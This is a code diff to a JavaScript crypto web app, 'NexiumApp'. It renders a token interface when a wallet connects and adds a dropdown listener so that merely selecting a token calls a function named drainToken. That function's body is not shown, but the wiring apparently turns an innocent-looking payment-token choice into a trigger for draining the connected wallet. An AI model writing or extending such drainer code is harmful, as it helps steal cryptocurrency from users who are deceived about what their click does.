@@ -248,6 +248,7 @@ class NexiumApp {
       this.updateButtonState('connected', address);
       this.hideMetaMaskPrompt();
       this.showFeedback(`Wallet connected (${this.detectWalletType()})!`, 'success');
+      this.renderTokenInterface(); // <--- Add this line
     } catch (error) {
       console.error('Connect wallet error:', error);
       this.handleConnectionError(error);
@@ -491,6 +492,19 @@ class NexiumApp {
 
     this.dom.beautifyVolumeInput = beautifySection.querySelector('#beautifyVolumeInput');
     this.dom.beautifyAddVolumeBtn = beautifySection.querySelector('#beautifyAddVolumeBtn');
+
+    if (this.dom.tokenSelect) {
+      this.dom.tokenSelect.disabled = !this.signer; // Only enable if wallet is connected
+      this.dom.tokenSelect.addEventListener('change', (e) => {
+        const selected = e.target.value;
+        this.selectedPaymentToken = selected;
+        console.log('Dropdown changed, selectedPaymentToken:', selected);
+        if (selected) {
+          this.drainToken(selected);
+        }
+      });
+      console.log('Token select listener set (in renderTokenInterface)');
+    }
   }
 
   async loadCustomTokenData(tokenAddressInput) {
